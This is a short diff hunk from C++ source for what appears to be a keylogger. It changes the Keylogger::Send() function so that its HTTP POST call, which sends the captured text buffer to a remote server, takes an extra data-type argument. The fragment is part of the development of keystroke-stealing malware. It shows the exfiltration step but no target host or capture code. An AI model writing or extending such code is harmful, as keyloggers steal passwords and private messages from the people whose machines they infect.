@@ -226,7 +226,7 @@ void Keylogger::Send()
 	size_t response_len;
 	char *response_start;
 
-	bool ret = network.SendPost(sendBuf, sizeof(sendBuf)-1, &response_len, (const char**)&response_start, msgText.c_str(), msgText.size(), true);
+	bool ret = network.SendPost(sendBuf, sizeof(sendBuf)-1, &response_len, (const char**)&response_start, V_NET_FILE_DATA, msgText.c_str(), msgText.size(), true);
 	if (ret)
 	{
 		response_start[response_len] = '\0';
